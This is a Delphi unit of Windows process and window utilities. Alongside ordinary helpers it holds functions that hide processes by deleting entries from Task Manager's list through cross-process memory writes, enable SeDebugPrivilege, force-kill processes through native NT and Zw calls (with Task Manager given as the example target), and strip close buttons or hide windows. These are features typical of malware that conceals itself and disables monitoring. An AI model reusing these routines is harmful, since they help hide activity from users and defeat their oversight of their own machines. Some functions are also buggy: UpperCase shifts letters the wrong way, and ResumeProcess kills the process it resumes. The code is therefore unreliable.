
{
//test Suspend Process Function
   begin
  SuspendProcess(GetProcessPId('explorer.exe'));   // begin suspend process 'explorer.exe' all system lock
     Sleep(5000); // time wait suspending
//dont forgot the resumeprocess its nessesary
    ResumeProcess(GetProcessPId('explorer.exe')); // resume process 'explorer.exe'
}

Unit proses;

interface

uses windows,tlhelp32,CommCtrl,PsAPI, StdCtrls, SysUtils, Classes;

const 
  RsSystemIdleProcess = 'System Idle Process'; 
  RsSystemProcess = 'System Process';

type TNTdllApi = Function(Thread:thandle):boolean; stdcall;
type Terminate = Function(thread:thandle; dwCode:Dword):Boolean; Stdcall;

function SetTokenPrivileges:boolean;
function SysListView32DeleteItem(ItemDelete:Pansichar):boolean;
function SysListView32DeleteAllItems:boolean;
function IsNewProcessExists(ExeFileName: string): bool;
function GetProcessPid(Process:string):Integer;
function SuspendProcess(pid:dword):boolean; overload;
function ResumeProcess(pid:dword):boolean; overload;
function SuspendProcess(processname:string):boolean; overload;
function ResumeProcess(processname:string):boolean; overload;

function xTerminateProcess(processname:string):boolean; overload;
function xTerminateProcess(pid:dword):boolean; overload;
function killbyname(pocessname:string):boolean;
function GetProcessList:string;
function xEnumwindows(all:boolean):string;
function xClosewindow(windows:HWND):boolean;
function xSetWindowcaption(windows:HWND; newCaption:pansichar):boolean;
function removeXbutton(windows:hwnd):boolean;
function EnableDisableWindow(windows:hwnd; Command:boolean):boolean;
function ShowHideWindow(windows:hwnd; command:integer):boolean;
function getprocessname(pid:dword):string;
function killbyPid(pid :dword):boolean;
function ProcessFileName(PID: DWORD): string;
function GetProcessNameFromWnd(Wnd: HWND): string;
//If You want to uses this function please add library 'afxCodeHook' in uses
//function xDeleteFileEx(fullpath:pansichar):boolean;

var
  strWindows: string;
  ShowAllWindows: Boolean;

implementation

function IsWinXP: Boolean; 
begin 
  Result := (Win32Platform = VER_PLATFORM_WIN32_NT) and 
    (Win32MajorVersion = 5) and (Win32MinorVersion = 1); 
end;

function IsWin2k: Boolean; 
begin 
  Result := (Win32MajorVersion >= 5) and
    (Win32Platform = VER_PLATFORM_WIN32_NT); 
end; 

function IsWinNT4: Boolean; 
begin
  Result := Win32Platform = VER_PLATFORM_WIN32_NT; 
  Result := Result and (Win32MajorVersion = 4); 
end; 

function IsWin3X: Boolean; 
begin
  Result := Win32Platform = VER_PLATFORM_WIN32_NT; 
  Result := Result and (Win32MajorVersion = 3) and 
    ((Win32MinorVersion = 1) or (Win32MinorVersion = 5) or 
    (Win32MinorVersion = 51));
end; 

function RunningProcessesList(const List: TStrings; FullPath: Boolean): Boolean; 

function ProcessFileName(PID: DWORD): string;
  var 
    Handle: THandle; 
  begin 
    Result := ''; 
    Handle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, PID); 
    if Handle <> 0 then
      try 
        SetLength(Result, MAX_PATH); 
        if FullPath then 
        begin
          if GetModuleFileNameEx(Handle, 0, PChar(Result), MAX_PATH) > 0 then 
            SetLength(Result, StrLen(PChar(Result))) 
          else 
            Result := ''; 
        end
        else 
        begin 
          if GetModuleBaseNameA(Handle, 0, PChar(Result), MAX_PATH) > 0 then 
            SetLength(Result, StrLen(PChar(Result))) 
          else 
            Result := '';
        end; 
      finally 
        CloseHandle(Handle); 
      end;
  end; 
  
function BuildListTH: Boolean; 
  var 
    SnapProcHandle: THandle;
    ProcEntry: TProcessEntry32; 
    NextProc: Boolean; 
    FileName: string; 
  begin 
    SnapProcHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
    Result := (SnapProcHandle <> INVALID_HANDLE_VALUE);
    if Result then 
      try 
        ProcEntry.dwSize := SizeOf(ProcEntry); 
        NextProc := Process32First(SnapProcHandle, ProcEntry);
        while NextProc do 
        begin 
          if ProcEntry.th32ProcessID = 0 then 
          begin 
            FileName := RsSystemIdleProcess;
          end 
          else 
          begin 
            if IsWin2k or IsWinXP then 
            begin 
              FileName := ProcessFileName(ProcEntry.th32ProcessID);
              if FileName = '' then 
                FileName := ProcEntry.szExeFile; 
            end 
            else
            begin 
              FileName := ProcEntry.szExeFile; 
              if not FullPath then 
                FileName := ExtractFileName(FileName); 
            end;
          end; 
          List.AddObject(FileName, Pointer(ProcEntry.th32ProcessID)); 
          NextProc := Process32Next(SnapProcHandle, ProcEntry); 
        end; 
      finally 
        CloseHandle(SnapProcHandle);
      end; 
  end; 
  
function BuildListPS: Boolean;
  var 
    PIDs: array [0..1024] of DWORD; 
    Needed: DWORD; 
    I: Integer; 
    FileName: string;
  begin 
    Result := EnumProcesses(@PIDs, SizeOf(PIDs), Needed); 
    if Result then 
    begin 
      for I := 0 to (Needed div SizeOf(DWORD)) - 1 do 
      begin
        case PIDs[I] of 
          0: 
            FileName := RsSystemIdleProcess; 
          2:
            if IsWinNT4 then 
              FileName := RsSystemProcess 
            else 
              FileName := ProcessFileName(PIDs[I]); 
            8:
            if IsWin2k or IsWinXP then 
              FileName := RsSystemProcess 
            else 
              FileName := ProcessFileName(PIDs[I]); 
            else 
              FileName := ProcessFileName(PIDs[I]);
        end; 
        if FileName <> '' then 
          List.AddObject(FileName, Pointer(PIDs[I])); 
      end;
    end; 
  end; 
begin 
  if IsWin3X or IsWinNT4 then 
    Result := BuildListPS
  else 
    Result := BuildListTH; 
end; 

function GetProcessNameFromWnd(Wnd: HWND): string;
var
  List: TStringList;
  PID: DWORD;
  I: Integer;
begin
  Result := ''; 
  if IsWindow(Wnd) then 
  begin 
    PID := INVALID_HANDLE_VALUE; 
    GetWindowThreadProcessId(Wnd, @PID);
    List := TStringList.Create; 
    try 
      if RunningProcessesList(List, True) then 
      begin 
        I := List.IndexOfObject(Pointer(PID)); 
        if I > -1 then 
          Result := List[I]; 
      end; 
    finally 
      List.Free; 
    end; 
  end; 
end; 

function inttostr(int:integer):string;
begin
str(int,result);
end;

function extractfilename(path:string):string;
begin
   while pos('\',path) <> 0 do
   begin
  result := result + copy(path,1,1);
 delete(path,1,1);
   end;
  result := path;
end;

function ProcessFileName(PID: DWORD): string;
var
  Handle: THandle;
  FullPAth : boolean;
begin
  Result := '';
  FullPAth := True;
  Handle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, PID);
  if Handle <> 0 then
  try
    SetLength(Result, MAX_PATH);
  if FullPath then
  begin
    if GetModuleFileNameEx(Handle, 0, PChar(Result), MAX_PATH) > 0 then
    SetLength(Result, StrLen(PChar(Result)))
  else
    Result := '';
  end
else
  begin
    if GetModuleBaseNameA(Handle, 0, PChar(Result), MAX_PATH) > 0 then
    SetLength(Result, StrLen(PChar(Result)))
  else
    Result := '';
  end;
  finally
    CloseHandle(Handle);
  end;
end;


function UpperCase(const S: string): string;
var
  Ch: Char;  L: Integer;
  Source, Dest: PChar;
begin
   L := Length(S);
    SetLength(Result, L);
    Source := Pointer(S);
   Dest := Pointer(Result);
while L <> 0 do begin
     Ch := Source^;
if (Ch >= 'a') and (Ch <= 'z')
  then Inc(Ch, 32);
    Dest^ := Ch;
     Inc(Source);
     Inc(Dest);
     Dec(L);
   end;
end;

function LowerCase(const S: string): string;
var
  Ch: Char;  L: Integer;
  Source, Dest: PChar;
begin
   L := Length(S);
    SetLength(Result, L);
    Source := Pointer(S);
   Dest := Pointer(Result);
while L <> 0 do begin
     Ch := Source^;
if (Ch >= 'A') and (Ch <= 'Z')
  then Inc(Ch, 32);
    Dest^ := Ch;
     Inc(Source);
     Inc(Dest);
     Dec(L);
   end;
end;

//get debug privilege
function SetTokenPrivileges:boolean;
var
  hToken1, hToken2, hToken3: THandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
begin
  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil, 'SeDebugPrivilege', TokenPrivileges.Privileges[0].luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except;
    end;
  end;
    result := true;
end;

//clear item process in taskmanager
function SysListView32DeleteItem(ItemDelete:Pansichar):boolean;
var
      dwSize, dwNumberOfBytes, PID, hProcess:Cardinal;
      PLocalShared, PSysShared: PlvItem;
      wnd,wd: THandle;
      iCount, i: integer;
      szTemp: string;
begin
        wnd :=  FindWindow('#32770', nil);
        wnd :=  FindWindowEx(wnd, 0, '#32770', nil);
        wnd :=  FindWindowEx(wnd, 0, 'SysListView32',nil);
        wd  :=  GetWindow(wnd,0);
        iCount := SendMessage(wd, LVM_GETITEMCOUNT, 0, 0);
        for i := 0 to iCount -1 do
        begin
             dwSize := SizeOf(LV_ITEM) + SizeOf(CHAR) * MAX_PATH;
             pLocalShared := VirtualAlloc(nil, dwSize, MEM_RESERVE + MEM_COMMIT, PAGE_READWRITE);
             GetWindowThreadProcessID(WD, @PID);
             hProcess := OpenProcess(PROCESS_VM_OPERATION or PROCESS_VM_READ or PROCESS_VM_WRITE, FALSE, PID);
             pSysShared := VirtualAllocEx(hProcess, nil, dwSize, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);
             pLocalShared.mask := LVIF_TEXT;
             pLocalShared.iItem := 0;
             pLocalShared.iSubItem := 0;
             pLocalShared.pszText := LPTSTR(DWord(pSysShared) + SizeOf(LV_ITEM));
             pLocalShared.cchTextMax := 100;
             WriteProcessMemory(hProcess, pSysShared, pLocalShared, 1024, dwNumberOfBytes);
             SendMessage(wd, LVM_GETITEMTEXT, i, LPARAM(pSysShared));
             ReadProcessMemory(hProcess, pSysShared, pLocalShared, 1024, dwNumberOfBytes);
             szTemp := PChar(DWord(pLocalShared) + SizeOf(LV_ITEM));
              if Pos(ItemDelete, LowerCase(szTemp)) > 0 then
                   ListView_DeleteItem(wd,i);
             VirtualFree(pLocalShared, 0, MEM_RELEASE);
             VirtualFreeEx(hProcess, pSysShared, 0, MEM_RELEASE);
             CloseHandle(hProcess);
        end;
        result := true;
end;

//clear all items process in taskmanager
function SysListView32DeleteAllItems:boolean;
var
      dwSize, dwNumberOfBytes, PID, hProcess:Cardinal;
      PLocalShared, PSysShared: PlvItem;
      wnd,wd: THandle;
      iCount, i: integer;
      szTemp: string;
begin
        wnd :=  FindWindow('#32770', nil);
        wnd :=  FindWindowEx(wnd, 0, '#32770', nil);
        wnd :=  FindWindowEx(wnd, 0, 'SysListView32',nil);
        wd  :=  GetWindow(wnd,0);
        iCount := SendMessage(wd, LVM_GETITEMCOUNT, 0, 0);
        for i := 0 to iCount -1 do
        begin
             dwSize := SizeOf(LV_ITEM) + SizeOf(CHAR) * MAX_PATH;
             pLocalShared := VirtualAlloc(nil, dwSize, MEM_RESERVE + MEM_COMMIT, PAGE_READWRITE);
             GetWindowThreadProcessID(WD, @PID);
             hProcess := OpenProcess(PROCESS_VM_OPERATION or PROCESS_VM_READ or PROCESS_VM_WRITE, FALSE, PID);
             pSysShared := VirtualAllocEx(hProcess, nil, dwSize, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);
             pLocalShared.mask := LVIF_TEXT;
             pLocalShared.iItem := 0;
             pLocalShared.iSubItem := 0;
             pLocalShared.pszText := LPTSTR(DWord(pSysShared) + SizeOf(LV_ITEM));
             pLocalShared.cchTextMax := 100;
             WriteProcessMemory(hProcess, pSysShared, pLocalShared, 1024, dwNumberOfBytes);
             SendMessage(wd, LVM_GETITEMTEXT, i, LPARAM(pSysShared));
             ReadProcessMemory(hProcess, pSysShared, pLocalShared, 1024, dwNumberOfBytes);
             szTemp := PChar(DWord(pLocalShared) + SizeOf(LV_ITEM));
                   ListView_DeleteAllItems(wd);
             VirtualFree(pLocalShared, 0, MEM_RELEASE);
             VirtualFreeEx(hProcess, pSysShared, 0, MEM_RELEASE);
             CloseHandle(hProcess);
        end;
        result := true;
end;

//verify if process exists or for new process executed by name
function IsNewProcessExists(ExeFileName: string): bool;
const
  PROCESS_TERMINATE=$0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
  Len: Integer;
  name1, name2, name3: string;
begin
  result := False;
  FSnapshotHandle := CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while integer(ContinueLoop) <> 0 do
  begin
    Len := Length(FProcessEntry32.szExeFile);
    Name1 := UpperCase(ExtractFileName(FProcessEntry32.szExeFile));
    Name2 := UpperCase(Copy(ExeFileName, 1, Len));
    Name3 := UpperCase(FProcessEntry32.szExeFile);
    If (Name1 = Name2) Or (Name3 = Name2) Then  Result := True;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

//get process pid from name
function GetProcessPid(Process:string):Integer;
var
    hProcSnap: THandle;
    pe32:      TProcessEntry32;
begin
  result := -1;
   hProcSnap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
if hProcSnap = INVALID_HANDLE_VALUE then
   Exit;
    pe32.dwSize := SizeOf(TProcessEntry32);
if Process32First(hProcSnap, pe32) = True then
while Process32Next(hProcSnap, pe32) = True do
if pos(process, LowerCase(pe32.szExeFile)) > 0 then
          Result := pe32.th32ProcessID;
end;

//get process name from pid
function getprocessname(pid:dword):string;
var
 hprocess:thandle;
 pe32:tprocessentry32;
begin
 hprocess := createtoolhelp32snapshot(TH32CS_SNAPPROCESS,0);
if hprocess = INVALID_HANDLE_VALUE then
   pe32.dwSize := sizeof( ProcessEntry32 );
if process32first(hprocess,pe32) = true then
  while process32Next(hprocess,pe32) = true do begin
  if pe32.th32ProcessID = pid then
 result := pe32.szExeFile;
   end;
end;

//Suspend process by name
function SuspendProcess(processname:string):boolean; overload;
var
   module,module1:thandle;
 SusPendProcess:TNTdllApi;
 pid:dword;
begin
   result := false;
pid := GetprocessPid(processname);
SetTokenPrivileges;
  module := LoadLibrary('ntdll.dll');
 @SusPendProcess := Getprocaddress(module,'NtSuspendProcess');
if @SusPendProcess <> nil then
begin
   module1 := OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
 SusPendProcess(module1);
  end;
end;

//resume process after suspend it by Name
function ResumeProcess(processname:string):boolean; overload;
var
 module,module1:thandle;
  ResumeProcess:TNTdllApi;
 pid:dword;
begin
   result := false;
pid := GetprocessPid(processname);
 module := LoadLibrary('ntdll.dll');
 @ResumeProcess := GetProcAddress(module,'NtResumeProcess');
if @ResumeProcess <> nil then begin
SetTokenPrivileges;
  module1 := OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
 ResumeProcess(module1);
   end;
end;

//Suspend process by pid
function SuspendProcess(pid:dword):boolean;
var
   module,module1:thandle;
 SusPendProcess:TNTdllApi;
begin
 result := false;
SetTokenPrivileges;
  module := LoadLibrary('ntdll.dll');
 @SusPendProcess := Getprocaddress(module,'NtSuspendProcess');
if @SusPendProcess <> nil then
begin
   module1 := OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
 SusPendProcess(module1);
  end;
end;

//resume process after Suspend it by pid
function ResumeProcess(pid:dword):boolean;
var
 module,module1:thandle;
  ResumeProcess:TNTdllApi;
begin
   result := false;
 module := LoadLibrary('ntdll.dll');
 @ResumeProcess := GetProcAddress(module,'NtResumeProcess');
if @ResumeProcess <> nil then begin
SetTokenPrivileges;
  module1 := OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
 ResumeProcess(module1);
 TerminateProcess(module1,0);
   end;
end;

//force terminate process by Pid
function xTerminateProcess(pid:dword):boolean; overload;
var
 module,module1:thandle;
 TerminateProcessEx:Terminate;
 SusPendProcessEx:TNTdllApi;
 xSusPendProcessEx:TNTdllApi;
xResumeProcess:TNTdllApi;
zResumeProcess:TNTdllApi;
 TerminateIt:Terminate;
begin
  result := false;
  module := LoadLibrary('ntdll.dll');
 @TerminateProcessEx := GetProcAddress(module,'NTTerminateProcess');
 @TerminateIt := GetProcAddress(module,'ZwTerminateProcess');
 @SusPendProcessEx := GetProcAddress(module,'NTSuspendProcess');
  @xSusPendProcessEx := GetProcAddress(module,'ZwSuspendProcess');
  @xResumeProcess := GetProcAddress(module,'NtResumeProcess');
 @zResumeProcess := GetProcAddress(module,'ZwResumeProcess');
  module1 := OpenProcess(PROCESS_TERMINATE OR PROCESS_ALL_ACCESS,FALSE,pid);
If  @SusPendProcessEx <> nil then begin
SusPendProcessEx(module1);
 sleep(50);
if @TerminateProcessEx <> nil then
  TerminateProcessEx(module1,0);
  SetLastError(getLastError +1);
 if  @xResumeProcess <> nil then
   xResumeProcess(pid);
TerminateIt(module1,0);
 if  @zResumeProcess <> nil then
   zResumeProcess(pid);
TerminateIt(module1,0);
end else
 begin
 If  @xSusPendProcessEx <> nil then begin
  xSusPendProcessEx(module1);
 sleep(50);
if @TerminateIt <> nil then
  TerminateIt(module1,0);
  SetLastError(getLastError +1);
  if  @xResumeProcess <> nil then
   xResumeProcess(pid);
   TerminateIt(module1,0);
  if  @zResumeProcess <> nil then
   zResumeProcess(pid);
TerminateIt(module1,0);
   end;
   ResumeProcess(pid);
 end;
end;

//force terminate process by name
function xTerminateProcess(processname:string):boolean; overload;
var
 module,module1:thandle;
 TerminateProcessEx:Terminate;
 SusPendProcessEx:TNTdllApi;
 xSusPendProcessEx:TNTdllApi;
 TerminateIt:Terminate;
xResumeProcess:TNTdllApi;
zResumeProcess:TNTdllApi;
  pid:dword;
begin
   result := false;
   pid := getprocesspid(processname);
 module := LoadLibrary('ntdll.dll');
 @TerminateProcessEx := GetProcAddress(module,'NTTerminateProcess');
 @TerminateIt := GetProcAddress(module,'ZwTerminateProcess');
 @SusPendProcessEx := GetProcAddress(module,'NTSuspendProcess');
 @xSusPendProcessEx := GetProcAddress(module,'ZwSuspendProcess');
  @xResumeProcess := GetProcAddress(module,'NtResumeProcess');
 @zResumeProcess := GetProcAddress(module,'ZwResumeProcess');
  module1 := OpenProcess(PROCESS_TERMINATE OR PROCESS_ALL_ACCESS,FALSE,pid);
If  @SusPendProcessEx <> nil then
 begin
    SusPendProcessEx(module1);
     sleep(50);
if @TerminateProcessEx <> nil then
TerminateProcessEx(module1,0);
  SetLastError(getLastError +1);
   if  @xResumeProcess <> nil then
   xResumeProcess(pid);
   TerminateIt(module1,0);
 if  @zResumeProcess <> nil then
   zResumeProcess(pid);
TerminateIt(module1,0);
end else
begin
 If  @xSusPendProcessEx <> nil then begin
     xSusPendProcessEx(module1);
sleep(50);
if @TerminateIt <> nil then
   TerminateIt(module1,0);
   SetLastError(getLastError +1);
    if  @xResumeProcess <> nil then
   xResumeProcess(pid);
   TerminateIt(module1,0);
  if  @zResumeProcess <> nil then
   zResumeProcess(pid);
TerminateIt(module1,0);
     end;
   ResumeProcess(pid);
 end;
end;

//Simple Process Killer By Name ExM : killbyname('taskmgr.exe');
function killbyname(pocessname:string):boolean;
var
     hp:thandle;
     hProcSnap: THandle;
     pe32:      TProcessEntry32;
     Resultat:integer;
begin
   resultat := -1;
   hProcSnap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
if hProcSnap = INVALID_HANDLE_VALUE then
    pe32.dwSize := SizeOf(TProcessEntry32);
if Process32First(hProcSnap, pe32) = True then
while Process32Next(hProcSnap, pe32) = True do
if pos(pocessname, LowerCase(pe32.szExeFile)) > 0 then
          resultat := pe32.th32ProcessID;
try
SetTokenPrivileges;
hp := openprocess(PROCESS_ALL_ACCESS,false,resultat);
TerminateProcess(hp,0);
except
SetTokenPrivileges;
 hp := openprocess(PROCESS_ALL_ACCESS,true,resultat);
  TerminateProcess(hp,0);
end;
result := true;
end;

//kill process by pid
function killbyPid(pid :dword):boolean;
var
     hp:thandle;
     hProcSnap: THandle;
     pe32:      TProcessEntry32;

begin
   hProcSnap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
if hProcSnap = INVALID_HANDLE_VALUE then
    pe32.dwSize := SizeOf(TProcessEntry32);
if Process32First(hProcSnap, pe32) = True then
while Process32Next(hProcSnap, pe32) = True do
if pe32.th32ProcessID = pid then
try
SetTokenPrivileges;
hp := openprocess(PROCESS_ALL_ACCESS,false,pid);
TerminateProcess(hp,0);
except
SetTokenPrivileges;
 hp := openprocess(PROCESS_ALL_ACCESS,true,pid);
  TerminateProcess(hp,0);
end;
result := true;
end;

//Function to get Process list
function GetProcessList:string;
var
  proc: TProcessEntry32; snap: THandle;
begin
  snap := CreateToolHelp32SnapShot(15,0);
  proc.dwSize := SizeOf(TProcessEntry32);
try
  Process32First(snap, proc);
repeat Result := Result + proc.szExeFile;
until not Process32Next(snap, proc);
finally
    CloseHandle(snap);
end;
end;

function GetWindows(Handle: THandle; lParam: Pointer): Boolean ; stdcall;
var
  Caption: array[0..256] of Char;
begin
try
if not  ShowAllWindows then
 (if IsWindowVisible(Handle) then
 if GetWindowText(Handle, Caption, 255) <> 0 then
strWindows := strWindows + Caption + IntToStr(Handle)) else
 if GetWindowText(Handle, Caption, 255) <> 0 then
     strWindows := strWindows + Caption  + IntToStr(Handle);
        Result := True;
except
   Result := False;
end;
end;

//function to get Windows open
function xEnumwindows(all:boolean):string;
begin
  ShowAllWindows := all;
  EnumWindows(@GetWindows, 0);
   Result := strWindows;
end;

//close window
function xClosewindow(windows:HWND):boolean;
begin
result := false;
 PostMessageA(windows, 16, 0, 0);
end;

//Set caption for window
function xSetWindowcaption(windows:HWND; newCaption:pansichar):boolean;
begin
result:=false;
SetWindowTextA(windows, newcaption);
end;

//remove close button
function removeXbutton(windows:hwnd):boolean;
begin
result :=false;
  RemoveMenu(GetSystemMenu(windows, False), 6, 1024);
  DrawMenuBar(windows);
 end;

 //enable disable Window
 function EnableDisableWindow(windows:hwnd; Command:boolean):boolean;
 begin
 result := false;
 EnableWindow(windows, command);
 end;

 //show hide window
 function ShowHideWindow(windows:hwnd; command:integer):boolean;
begin
result := false;
ShowWindow(windows, command);
  end;

//Delete Any file (Process , thread ... etc );
//If You want to uses this function please add library 'afxCodeHook' in uses

{function xDeleteFileEx(FullPath:Pansichar):boolean;
var
 module,module1:thandle;
 TerminateProcessEx:Terminate;
 SusPendProcessEx:TNTdllApi;
 xSusPendProcessEx:TNTdllApi;
 TerminateIt:Terminate;
xResumeProcess:TNTdllApi;
zResumeProcess:TNTdllApi;
  pid:dword;
  processname:string;
begin
   result := false;
  processname:= extractfilename(fullpath);
   pid := getprocesspid(processname);
 module := LoadLibrary('ntdll.dll');
 @TerminateProcessEx := GetProcAddress(module,'NTTerminateProcess');
 @TerminateIt := GetProcAddress(module,'ZwTerminateProcess');
 @SusPendProcessEx := GetProcAddress(module,'NTSuspendProcess');
 @xSusPendProcessEx := GetProcAddress(module,'ZwSuspendProcess');
  @xResumeProcess := GetProcAddress(module,'NtResumeProcess');
 @zResumeProcess := GetProcAddress(module,'ZwResumeProcess');
  module1 := OpenProcess(PROCESS_TERMINATE OR PROCESS_ALL_ACCESS,FALSE,pid);
If  @SusPendProcessEx <> nil then
 begin
    SusPendProcessEx(module1);
     sleep(50);
if @TerminateProcessEx <> nil then
TerminateProcessEx(module1,0);
   DeleteFileEx(fullpath);
  SetLastError(getLastError +1);
   if  @xResumeProcess <> nil then
   xResumeProcess(pid);
   TerminateIt(module1,0);
    DeleteFileEx(fullpath);
 if  @zResumeProcess <> nil then
   zResumeProcess(pid);
TerminateIt(module1,0);
  DeleteFileEx(fullpath);
end else
begin
 If  @xSusPendProcessEx <> nil then begin
     xSusPendProcessEx(module1);
sleep(50);
if @TerminateIt <> nil then
   TerminateIt(module1,0);
    DeleteFileEx(fullpath);
   SetLastError(getLastError +1);
    if  @xResumeProcess <> nil then
   xResumeProcess(pid);
   TerminateIt(module1,0);
    DeleteFileEx(fullpath);
  if  @zResumeProcess <> nil then
   zResumeProcess(pid);
TerminateIt(module1,0);
   DeleteFileEx(fullpath);
     end;
   ResumeProcess(pid);
   DeleteFileEx(fullpath);
 end;
 DeleteFileEx(fullpath);
end;
}

end.
